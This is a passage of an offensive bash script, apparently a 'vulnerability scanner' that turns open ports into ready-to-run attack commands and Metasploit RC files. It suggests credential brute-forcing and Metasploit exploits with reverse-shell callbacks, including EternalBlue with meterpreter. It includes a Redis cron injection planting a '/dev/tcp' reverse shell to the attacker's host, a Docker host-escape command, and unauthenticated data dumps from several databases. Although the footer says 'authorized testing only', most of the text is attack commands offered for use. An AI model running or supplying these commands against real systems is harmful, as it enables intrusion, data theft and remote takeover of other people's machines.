            suggestions+=("  [MSF login]      : use auxiliary/scanner/postgres/postgres_login | set RHOSTS $ip | run")
            suggestions+=("  [MSF hashdump]   : use auxiliary/scanner/postgres/postgres_hashdump | set RHOSTS $ip | run")
            suggestions+=("  [MSF exec]       : use exploit/multi/postgres/postgres_copy_from_program_cmd_exec | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run")
            ;;

        1433)
            suggestions+=("── MSSQL (port $port) ────────────────────────────────────")
            severity_add "$ip" "HIGH" "MSSQL exposed on port $port"
            suggestions+=("  [Hydra]          : hydra -L $WORDLIST_USERS -P $WORDLIST_PASS mssql://$ip -t $THREADS")
            suggestions+=("  [MSF login]      : use auxiliary/scanner/mssql/mssql_login | set RHOSTS $ip | run")
            suggestions+=("  [MSF enum]       : use auxiliary/admin/mssql/mssql_enum | set RHOSTS $ip | run")
            suggestions+=("  [MSF exec]       : use auxiliary/admin/mssql/mssql_exec | set RHOSTS $ip | set CMD whoami | run")
            suggestions+=("  [MSF xp_cmd]     : use exploit/windows/mssql/mssql_payload | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run")
            suggestions+=("  [Impacket]       : mssqlclient.py sa:password@$ip")
            ;;

        1521)
            suggestions+=("── Oracle DB (port $port) ────────────────────────────────")
            severity_add "$ip" "HIGH" "Oracle DB on port $port"
            suggestions+=("  [SID enum]       : use auxiliary/scanner/oracle/sid_enum | set RHOSTS $ip | run")
            suggestions+=("  [SID brute]      : use auxiliary/scanner/oracle/sid_brute | set RHOSTS $ip | run")
            suggestions+=("  [MSF login]      : use auxiliary/scanner/oracle/oracle_login | set RHOSTS $ip | run")
            suggestions+=("  [MSF hashdump]   : use auxiliary/scanner/oracle/oracle_hashdump | set RHOSTS $ip | run")
            ;;

        6379)
            suggestions+=("── Redis (port $port) ────────────────────────────────────")
            severity_add "$ip" "CRITICAL" "Redis exposed without auth on port $port"
            suggestions+=("  [Unauth check]   : redis-cli -h $ip ping")
            suggestions+=("  [Dump keys]      : redis-cli -h $ip keys '*'")
            suggestions+=("  [MSF scanner]    : use auxiliary/scanner/redis/redis_server | set RHOSTS $ip | run")
            suggestions+=("  [MSF file write] : use auxiliary/scanner/redis/redis_server (check for config rewrite)")
            suggestions+=("  [RCE via cron]   : redis-cli -h $ip config set dir /var/spool/cron/crontabs")
            suggestions+=("  [RCE via cron]   : redis-cli -h $ip config set dbfilename root")
            suggestions+=("  [RCE via cron]   : redis-cli -h $ip set x '\\n\\n* * * * * bash -i >& /dev/tcp/$lh/$LPORT 0>&1\\n\\n'")
            suggestions+=("  [RCE via cron]   : redis-cli -h $ip save")
            ;;

        9200|9300)
            suggestions+=("── Elasticsearch (port $port) ────────────────────────────")
            severity_add "$ip" "CRITICAL" "Elasticsearch exposed on port $port"
            suggestions+=("  [Check unauth]   : curl -s http://$ip:$port/")
            suggestions+=("  [List indices]   : curl -s http://$ip:$port/_cat/indices?v")
            suggestions+=("  [Dump all]       : curl -s http://$ip:$port/_search?size=10000&pretty")
            suggestions+=("  [MSF enum]       : use auxiliary/scanner/elasticsearch/indices_enum | set RHOSTS $ip | set RPORT $port | run")
            ;;

        27017|27018|27019)
            suggestions+=("── MongoDB (port $port) ──────────────────────────────────")
            severity_add "$ip" "CRITICAL" "MongoDB exposed on port $port"
            suggestions+=("  [Unauth check]   : mongosh $ip --eval 'db.adminCommand({listDatabases:1})'")
            suggestions+=("  [Legacy client]  : mongo $ip --eval 'db.adminCommand({listDatabases:1})'")
            suggestions+=("  [MSF scanner]    : use auxiliary/scanner/mongodb/mongodb_login | set RHOSTS $ip | run")
            suggestions+=("  [Dump data]      : use auxiliary/gather/mongodb_js_inject_collection_enum | set RHOSTS $ip | run")
            ;;

        161|162)
            suggestions+=("── SNMP (port $port/UDP) ─────────────────────────────────")
            severity_add "$ip" "MEDIUM" "SNMP on port $port"
            suggestions+=("  [Community brute]: onesixtyone -c /usr/share/doc/onesixtyone/dict.txt $ip")
            suggestions+=("  [snmpwalk pub]   : snmpwalk -v2c -c public $ip")
            suggestions+=("  [snmpwalk priv]  : snmpwalk -v2c -c private $ip")
            suggestions+=("  [MSF enum]       : use auxiliary/scanner/snmp/snmp_enum | set RHOSTS $ip | run")
            suggestions+=("  [MSF community]  : use auxiliary/scanner/snmp/snmp_enumusers | set RHOSTS $ip | run")
            suggestions+=("  [MSF login]      : use auxiliary/scanner/snmp/snmp_login | set RHOSTS $ip | run")
            ;;

        2049)
            suggestions+=("── NFS (port $port) ──────────────────────────────────────")
            severity_add "$ip" "HIGH" "NFS exposed on port $port"
            suggestions+=("  [Show exports]   : showmount -e $ip")
            suggestions+=("  [Mount share]    : mount -t nfs $ip:/export /mnt/nfs")
            suggestions+=("  [MSF mounts]     : use auxiliary/scanner/nfs/nfsmount | set RHOSTS $ip | run")
            suggestions+=("  [Nmap nfs]       : nmap --script=nfs-showmount,nfs-ls,nfs-statfs -p 2049 $ip")
            ;;

        5900|5901|5902)
            suggestions+=("── VNC (port $port) ──────────────────────────────────────")
            severity_add "$ip" "HIGH" "VNC on port $port"
            suggestions+=("  [No auth check]  : use auxiliary/scanner/vnc/vnc_none_auth | set RHOSTS $ip | run")
            suggestions+=("  [Hydra]          : hydra -P $WORDLIST_PASS vnc://$ip -s $port -t 4")
            suggestions+=("  [MSF login]      : use auxiliary/scanner/vnc/vnc_login | set RHOSTS $ip | set RPORT $port | run")
            suggestions+=("  [Connect]        : vncviewer $ip:$port")
            ;;

        6000|6001)
            suggestions+=("── X11 (port $port) ──────────────────────────────────────")
            severity_add "$ip" "CRITICAL" "X11 exposed on port $port"
            suggestions+=("  [No auth check]  : nmap --script=x11-access -p $port $ip")
            suggestions+=("  [Screenshot]     : xwd -root -screen -silent -display $ip:0 -out /tmp/screen.xwd")
            suggestions+=("  [MSF X11]        : use exploit/unix/x11/x11_keyboard_exec | set RHOSTS $ip | run")
            ;;

        8161|61616)
            suggestions+=("── ActiveMQ (port $port) ─────────────────────────────────")
            severity_add "$ip" "CRITICAL" "ActiveMQ on port $port"
            suggestions+=("  *** Check for CVE-2023-46604 (RCE) ***")
            suggestions+=("  [MSF]            : use exploit/multi/misc/apache_activemq_rce_cve_2023_46604 | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run")
            suggestions+=("  [Default creds]  : admin:admin on web console http://$ip:8161/admin")
            ;;

        4848)
            suggestions+=("── GlassFish (port $port) ────────────────────────────────")
            severity_add "$ip" "HIGH" "GlassFish admin on port $port"
            suggestions+=("  [Default creds]  : admin:adminadmin → http://$ip:$port")
            suggestions+=("  [MSF]            : use auxiliary/scanner/http/glassfish_traversal | set RHOSTS $ip | run")
            ;;

        8080|8443)
            if [[ "$svc_lower" == *"tomcat"* || "$svc_lower" == *"apache-coyote"* ]]; then
                suggestions+=("── Apache Tomcat (port $port) ────────────────────────────")
                severity_add "$ip" "HIGH" "Apache Tomcat on port $port"
                suggestions+=("  [Default creds]  : tomcat:tomcat, admin:admin, manager:manager")
                suggestions+=("  [MSF manager]    : use auxiliary/scanner/http/tomcat_mgr_login | set RHOSTS $ip | set RPORT $port | run")
                suggestions+=("  [MSF war deploy] : use exploit/multi/http/tomcat_mgr_upload | set RHOSTS $ip | set RPORT $port | set LHOST $lh | set LPORT $LPORT | run")
                suggestions+=("  [MSF JSP shell]  : use exploit/multi/http/tomcat_jsp_upload_bypass | set RHOSTS $ip | set RPORT $port | set LHOST $lh | run")
            fi
            ;;

        9090|9091)
            suggestions+=("── Web Admin Panel (port $port) ──────────────────────────")
            severity_add "$ip" "MEDIUM" "Possible admin panel on port $port"
            suggestions+=("  [Browse]         : curl -s http://$ip:$port/ | head -30")
            suggestions+=("  [Hydra HTTP]     : hydra -L $WORDLIST_USERS -P $WORDLIST_PASS http-get://$ip:$port/")
            ;;

        10000)
            suggestions+=("── Webmin (port $port) ───────────────────────────────────")
            severity_add "$ip" "CRITICAL" "Webmin on port $port"
            suggestions+=("  [MSF RCE]        : use exploit/unix/webapp/webmin_show_cgi_exec | set RHOSTS $ip | set RPORT $port | set LHOST $lh | set LPORT $LPORT | run")
            suggestions+=("  [MSF backdoor]   : use exploit/linux/http/webmin_backdoor | set RHOSTS $ip | set RPORT $port | set LHOST $lh | set LPORT $LPORT | run")
            ;;

        11211)
            suggestions+=("── Memcached (port $port) ────────────────────────────────")
            severity_add "$ip" "CRITICAL" "Memcached exposed on port $port"
            suggestions+=("  [Dump keys]      : echo 'stats items' | nc -q1 $ip $port")
            suggestions+=("  [MSF dump]       : use auxiliary/gather/memcache_extractor | set RHOSTS $ip | run")
            ;;

        2375|2376)
            suggestions+=("── Docker API (port $port) ───────────────────────────────")
            severity_add "$ip" "CRITICAL" "Docker daemon exposed on port $port"
            suggestions+=("  [List containers]: curl -s http://$ip:$port/containers/json | python3 -m json.tool")
            suggestions+=("  [List images]    : curl -s http://$ip:$port/images/json | python3 -m json.tool")
            suggestions+=("  [Escape to host] : docker -H $ip:$port run -v /:/mnt --rm -it alpine chroot /mnt sh")
            suggestions+=("  [MSF]            : use exploit/linux/http/docker_daemon_tcp | set RHOSTS $ip | set RPORT $port | set LHOST $lh | set LPORT $LPORT | run")
            ;;

        2181)
            suggestions+=("── ZooKeeper (port $port) ────────────────────────────────")
            severity_add "$ip" "HIGH" "ZooKeeper on port $port"
            suggestions+=("  [Unauth check]   : echo ruok | nc $ip $port")
            suggestions+=("  [Dump data]      : echo dump | nc $ip $port")
            ;;

        5985|5986)
            suggestions+=("── WinRM (port $port) ────────────────────────────────────")
            severity_add "$ip" "HIGH" "WinRM on port $port"
            suggestions+=("  [Evil-WinRM]     : evil-winrm -i $ip -u administrator -p password")
            suggestions+=("  [CrackMapExec]   : crackmapexec winrm $ip -u $WORDLIST_USERS -p $WORDLIST_PASS")
            suggestions+=("  [MSF login]      : use auxiliary/scanner/winrm/winrm_login | set RHOSTS $ip | run")
            ;;

        *)
            if [[ -n "$service" && "$service" != "unknown" && -n "$service" ]]; then
                suggestions+=("── $service (port $port) ──────────────────────────────")
                suggestions+=("  [MSF search]     : search type:exploit name:$service")
                suggestions+=("  [Searchsploit]   : searchsploit $product $version")
                suggestions+=("  [Hydra]          : hydra -L $WORDLIST_USERS -P $WORDLIST_PASS -s $port $ip $service")
                severity_add "$ip" "LOW" "Unknown service $service on port $port"
            fi
            ;;
    esac

    if [[ ${#suggestions[@]} -gt 0 ]]; then
        local cpe_note=""
        [[ -n "$cpe" ]] && cpe_note="  [CPE]            : $cpe"
        local ver_note=""
        [[ -n "$product" || -n "$version" ]] && \
            ver_note="  [Version]        : $product $version $extra_info"

        {
            [[ -n "$ver_note" ]] && echo "$ver_note"
            [[ -n "$cpe_note" ]] && echo "$cpe_note"
            printf '%s\n' "${suggestions[@]}"
            echo ""
        } >> "${ATTACK_MAP[$ip]:+/dev/null}"

        ATTACK_MAP["$ip"]+=$(
            [[ -n "$ver_note" ]] && echo "$ver_note"
            [[ -n "$cpe_note" ]] && echo "$cpe_note"
            printf '%s\n' "${suggestions[@]}"
            echo ""
        )
    fi
}

generate_msf_rc() {
    [[ $GENERATE_MSF_RC -eq 0 ]] && return
    log STEP "Generating Metasploit RC files"

    local lh="${LHOST:-LHOST}"

    for ip in "${!ATTACK_MAP[@]}"; do
        local rc_file="$OUTDIR/msf_rc/${ip//\//_}.rc"
        {
            echo "# Metasploit RC for $ip"
            echo "# Generated: $(date)"
            echo ""
            echo "setg RHOSTS $ip"
            echo "setg LHOST $lh"
            echo "setg LPORT $LPORT"
            echo ""

            local ports="${OPEN_PORTS_MAP[$ip]:-}"
            for port in $ports; do
                local svc_entry="${SERVICE_MAP["${ip}:${port}"]:-}"
                local service
                service=$(echo "$svc_entry" | cut -d'|' -f1)

                case "$port" in
                    21)  echo "use auxiliary/scanner/ftp/anonymous"; echo "set RPORT 21"; echo "run"; echo "" ;;
                    22)  echo "use auxiliary/scanner/ssh/ssh_login"; echo "set RPORT 22"; echo "set USER_FILE $WORDLIST_USERS"; echo "set PASS_FILE $WORDLIST_PASS"; echo "run"; echo "" ;;
                    23)  echo "use auxiliary/scanner/telnet/telnet_login"; echo "run"; echo "" ;;
                    139|445) echo "use auxiliary/scanner/smb/smb_version"; echo "run"; echo ""
                             echo "use auxiliary/scanner/smb/smb_enumshares"; echo "run"; echo ""
                             echo "use auxiliary/scanner/smb/smb_login"; echo "set USER_FILE $WORDLIST_USERS"; echo "set PASS_FILE $WORDLIST_PASS"; echo "run"; echo "" ;;
                    3306) echo "use auxiliary/scanner/mysql/mysql_login"; echo "set USERNAME root"; echo "set BLANK_PASSWORDS true"; echo "run"; echo "" ;;
                    5432) echo "use auxiliary/scanner/postgres/postgres_login"; echo "run"; echo "" ;;
                    1433) echo "use auxiliary/scanner/mssql/mssql_login"; echo "run"; echo "" ;;
                    3389) echo "use auxiliary/scanner/rdp/rdp_scanner"; echo "set RPORT 3389"; echo "run"; echo "" ;;
                    161)  echo "use auxiliary/scanner/snmp/snmp_enum"; echo "run"; echo "" ;;
                esac
            done

            local cves="${CVE_MAP["${ip}:445"]:-} ${CVE_MAP["${ip}:139"]:-}"
            if echo "$cves" | grep -q "CVE-2017-0144"; then
                echo "# EternalBlue"
                echo "use exploit/windows/smb/ms17_010_eternalblue"
                echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp"
                echo "run"
                echo ""
            fi

        } > "$rc_file"
        log OK "MSF RC: $rc_file"
        log INFO "  Run with: msfconsole -r $rc_file"
    done
}

generate_html_report() {
    [[ $GENERATE_HTML -eq 0 ]] && return
    log STEP "Generating HTML Report"

    local html_file="$OUTDIR/report.html"
    local ts
    ts=$(date '+%Y-%m-%d %H:%M:%S')

    cat > "$html_file" << HTMLEOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vuln Scan Report – $TARGET</title>
<style>
  :root {
    --bg: #0d1117; --bg2: #161b22; --bg3: #21262d;
    --border: #30363d; --text: #c9d1d9; --muted: #8b949e;
    --red: #f85149; --orange: #e3b341; --yellow: #d29922;
    --green: #3fb950; --blue: #58a6ff; --purple: #bc8cff;
    --cyan: #39d0d8;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', monospace; font-size: 14px; }
  header { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 20px 40px; }
  header h1 { color: var(--cyan); font-size: 24px; letter-spacing: 2px; }
  header .meta { color: var(--muted); margin-top: 6px; font-size: 12px; }
  .container { max-width: 1400px; margin: 0 auto; padding: 20px 40px; }
  .summary-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin: 24px 0; }
  .stat-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; padding: 20px; text-align: center; }
  .stat-card .num { font-size: 36px; font-weight: bold; }
  .stat-card .lbl { color: var(--muted); font-size: 12px; margin-top: 4px; text-transform: uppercase; letter-spacing: 1px; }
  .critical .num { color: var(--red); }
  .high .num { color: var(--orange); }
  .medium .num { color: var(--yellow); }
  .low .num { color: var(--green); }
  .host-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; margin: 20px 0; overflow: hidden; }
  .host-header { background: var(--bg3); padding: 14px 20px; display: flex; align-items: center; gap: 16px; border-bottom: 1px solid var(--border); }
  .host-ip { color: var(--blue); font-size: 18px; font-weight: bold; font-family: monospace; }
  .host-os { color: var(--muted); font-size: 12px; }
  .badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: bold; text-transform: uppercase; }
  .badge-crit { background: rgba(248,81,73,0.2); color: var(--red); border: 1px solid var(--red); }
  .badge-high { background: rgba(227,179,65,0.2); color: var(--orange); border: 1px solid var(--orange); }
  .badge-med  { background: rgba(210,153,34,0.2); color: var(--yellow); border: 1px solid var(--yellow); }
  .badge-low  { background: rgba(63,185,80,0.2); color: var(--green); border: 1px solid var(--green); }
  .ports-row { padding: 10px 20px; border-bottom: 1px solid var(--border); display: flex; flex-wrap: wrap; gap: 8px; }
  .port-tag { background: var(--bg3); border: 1px solid var(--border); border-radius: 4px; padding: 2px 8px; font-size: 12px; font-family: monospace; color: var(--purple); }
  .cve-row { padding: 10px 20px; border-bottom: 1px solid var(--border); }
  .cve-tag { display: inline-block; background: rgba(248,81,73,0.15); border: 1px solid var(--red); color: var(--red); border-radius: 4px; padding: 2px 8px; font-size: 11px; margin: 2px; font-family: monospace; }
  .attacks-block { padding: 16px 20px; }
  .attacks-block pre { background: #010409; border: 1px solid var(--border); border-radius: 6px; padding: 14px; overflow-x: auto; font-size: 12px; line-height: 1.6; color: #e6edf3; white-space: pre-wrap; word-break: break-all; }
  footer { text-align: center; padding: 30px; color: var(--muted); font-size: 12px; border-top: 1px solid var(--border); margin-top: 40px; }
  .section-title { color: var(--cyan); font-size: 11px; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 8px; }
  .no-vulns { padding: 20px; color: var(--muted); font-style: italic; }
</style>
</head>
<body>
<header>
  <h1>⚡ VULN SCAN REPORT</h1>
  <div class="meta">Target: <strong>$TARGET</strong> &nbsp;|&nbsp; Generated: $ts &nbsp;|&nbsp; Mode: $SCAN_MODE &nbsp;|&nbsp; Tool v${VERSION}</div>
</header>
<div class="container">

<div class="summary-grid">
  <div class="stat-card critical"><div class="num">$CRITICAL_COUNT</div><div class="lbl">Critical</div></div>
  <div class="stat-card high"><div class="num">$HIGH_COUNT</div><div class="lbl">High</div></div>
  <div class="stat-card medium"><div class="num">$MEDIUM_COUNT</div><div class="lbl">Medium</div></div>
  <div class="stat-card low"><div class="num">$LOW_COUNT</div><div class="lbl">Low</div></div>
</div>

HTMLEOF

    for ip in "${!ATTACK_MAP[@]}"; do
        local os_str="${OS_MAP[$ip]:-Unknown OS}"
        local hostname_str="${HOSTNAME_MAP[$ip]:-}"
        local ports_str="${OPEN_PORTS_MAP[$ip]:-}"
        local cves_for_host=""

        for key in "${!CVE_MAP[@]}"; do
            if [[ "$key" == "$ip:"* ]]; then
                cves_for_host+=" ${CVE_MAP[$key]}"
            fi
        done

        local host_severity="low"
        for key in "${!SEVERITY_MAP[@]}"; do
            if [[ "$key" == "${ip}_CRITICAL"* ]]; then host_severity="critical"; break
            elif [[ "$key" == "${ip}_HIGH"* && "$host_severity" != "critical" ]]; then host_severity="high"
            elif [[ "$key" == "${ip}_MEDIUM"* && "$host_severity" != "critical" && "$host_severity" != "high" ]]; then host_severity="medium"
            fi
        done

        local badge_class badge_label
        case "$host_severity" in
            critical) badge_class="badge-crit"; badge_label="CRITICAL" ;;
            high)     badge_class="badge-high"; badge_label="HIGH" ;;
            medium)   badge_class="badge-med";  badge_label="MEDIUM" ;;
            *)        badge_class="badge-low";  badge_label="LOW" ;;
        esac

        local attacks_escaped
        attacks_escaped=$(echo "${ATTACK_MAP[$ip]}" | sed 's/\x1b\[[0-9;]*m//g' | sed 's/</\&lt;/g; s/>/\&gt;/g')

        cat >> "$html_file" << HOSTEOF
<div class="host-card">
  <div class="host-header">
    <span class="host-ip">$ip</span>
    <span class="badge $badge_class">$badge_label</span>
    <span class="host-os">$os_str${hostname_str:+ | $hostname_str}</span>
  </div>
HOSTEOF

        if [[ -n "$ports_str" ]]; then
            echo "  <div class=\"ports-row\">" >> "$html_file"
            echo "    <span class=\"section-title\" style=\"align-self:center\">Open Ports:</span>" >> "$html_file"
            for port in $ports_str; do
                echo "    <span class=\"port-tag\">$port</span>" >> "$html_file"
            done
            echo "  </div>" >> "$html_file"
        fi

        if [[ -n "$cves_for_host" ]]; then
            echo "  <div class=\"cve-row\">" >> "$html_file"
            echo "    <span class=\"section-title\">CVEs Detected:</span><br>" >> "$html_file"
            for cve in $cves_for_host; do
                echo "    <span class=\"cve-tag\">$cve</span>" >> "$html_file"
            done
            echo "  </div>" >> "$html_file"
        fi

        cat >> "$html_file" << ATTACKEOF
  <div class="attacks-block">
    <div class="section-title">Attack Surface &amp; Commands</div>
    <pre>$attacks_escaped</pre>
  </div>
</div>
ATTACKEOF
    done

    cat >> "$html_file" << ENDHTML
</div>
<footer>
  Generated by vuln_scanner_advanced.sh v${VERSION} &nbsp;|&nbsp; For authorized testing only
</footer>
</body>
</html>
ENDHTML

    log OK "HTML report: $html_file"
}

generate_text_report() {
    local report_file="$OUTDIR/attack_suggestions.txt"
    {
        echo "========================================================"
        echo "  Advanced Vulnerability Scan Report"
        echo "  Generated : $(date)"
        echo "  Target    : $TARGET"
        echo "  Mode      : $SCAN_MODE"
        echo "========================================================"
        echo ""
        echo "SUMMARY"
        echo "  Critical : $CRITICAL_COUNT"
        echo "  High     : $HIGH_COUNT"
        echo "  Medium   : $MEDIUM_COUNT"
        echo "  Low      : $LOW_COUNT"
        echo "  Total    : $TOTAL_VULNS"
        echo ""
        echo "========================================================"
        echo ""

        for ip in "${!ATTACK_MAP[@]}"; do
            echo "TARGET: $ip"
            [[ -n "${OS_MAP[$ip]:-}" ]]       && echo "  OS       : ${OS_MAP[$ip]}"
            [[ -n "${HOSTNAME_MAP[$ip]:-}" ]] && echo "  Hostname : ${HOSTNAME_MAP[$ip]}"
            [[ -n "${OPEN_PORTS_MAP[$ip]:-}" ]] && echo "  Ports    : ${OPEN_PORTS_MAP[$ip]}"

            local host_cves=""
            for key in "${!CVE_MAP[@]}"; do
                [[ "$key" == "$ip:"* ]] && host_cves+=" ${CVE_MAP[$key]}"
            done
            [[ -n "$host_cves" ]] && echo "  CVEs     :$host_cves"
            echo ""
            echo "${ATTACK_MAP[$ip]}" | sed 's/\x1b\[[0-9;]*m//g'
            echo "--------------------------------------------------------"
            echo ""
        done
    } > "$report_file"
    log OK "Text report: $report_file"
}

print_summary() {
    log STEP "Scan Complete"
    echo ""
    echo -e "  ${BOLD}Total Vulnerabilities Found${RESET}"
    echo -e "  ${LRED}Critical : $CRITICAL_COUNT${RESET}"
    echo -e "  ${YELLOW}High     : $HIGH_COUNT${RESET}"
    echo -e "  ${YELLOW}Medium   : $MEDIUM_COUNT${RESET}"
    echo -e "  ${GREEN}Low      : $LOW_COUNT${RESET}"
    echo ""
    echo -e "  ${BOLD}Targets with attack surface : ${#ATTACK_MAP[@]}${RESET}"
    echo ""
    echo -e "  ${CYAN}Outputs:${RESET}"
    echo -e "    Nmap XML    : $XML_OUT"
    echo -e "    Text report : $OUTDIR/attack_suggestions.txt"
    [[ $GENERATE_HTML -eq 1 ]]    && echo -e "    HTML report : $OUTDIR/report.html"
    [[ $GENERATE_MSF_RC -eq 1 ]]  && echo -e "    MSF RC files: $OUTDIR/msf_rc/"
    echo -e "    Loot/banners: $OUTDIR/loot/"
    echo -e "    Scan log    : $LOG_FILE"
    echo ""

    if [[ $CRITICAL_COUNT -gt 0 ]]; then
        log CRIT "CRITICAL vulnerabilities found! Review the report immediately."
    fi
}

main() {
    banner
    parse_args "$@"
    check_deps
    setup_output
    print_config
    phase_host_discovery
    phase_port_scan
    phase_banner_grab
    parse_nmap_xml

    if [[ ${#ATTACK_MAP[@]} -eq 0 ]]; then
        log WARN "No exploitable services found on any host. Stopping."
        exit 0
    fi

    generate_msf_rc
    generate_text_report
    generate_html_report
    print_summary
}

main "$@"
